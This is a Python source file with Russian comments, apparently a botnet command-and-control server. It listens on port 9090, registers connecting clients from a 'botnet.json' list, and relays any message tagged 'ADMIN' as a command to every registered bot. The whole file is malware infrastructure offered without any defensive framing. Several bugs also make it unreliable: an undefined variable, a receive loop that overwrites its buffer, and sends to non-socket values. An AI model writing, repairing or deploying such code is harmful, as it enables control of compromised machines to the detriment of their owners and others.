      # импортируем библиотеку
import socket
import threading
import json
import struct

connections = []

# создаем сокет
sock = socket.socket()
# выбираем ip по-умолчанию и порт 9090 (можно и другой)
sock.bind(('', 9090))
# максимальное количество ожидающих подключений
sock.listen(50)
# ждем, пока к нам кто то подключится

with open("botnet.json", "r") as file:
    botnet_clients = file.read()
    botnet_clients = json.loads(botnet_clients)

def send(conn, comm):
    print(conn, comm)
    info2 = struct.pack("<I", len(comm))
    conn.send(info2)
    conn.send(comm.encode("utf-8"))

def action(message, user):
    list = json.loads(message)

    print(list["id"])

    if (str(list["id"]) != "ADMIN"):
        print(list["id"])


    if (list["id"] == "ADMIN"):
        print("ADMIN", list["message"])
        for i in botnet_clients:
            try:
                print(botnet_clients[i])
                send(botnet_clients[i], list["message"])
            except:
                print("1No")
        try:
            send(user, "recived")
        except:
            print("2No")

    #


    elif (list["id"] in botnet_clients):
        pass
    else:
        botnet_clients[list["id"]] = conn

        # with open("botnet.json", "w") as file:
        #     file.write(json.dumps(botnet_clients))

def check(conn):
    try:
        while True:
            data_size = b''

            while len(data_size) < 4:
                data_size += conn.recv(4 - len(data_size))

            size = struct.unpack("<I", data_size)[0]

            data_size = b''

            while len(data_size) < size:
                data_size = conn.recv(size - len(data_size))

            data = data_size.decode("utf-8")
            action(data, conn)
    except:
        print("error check")



while True:
    conn, addr = sock.accept()
    connections.append(conn)
    try:
        threading.Thread(target=check, args=[conn]).start()
    except:
        print("error")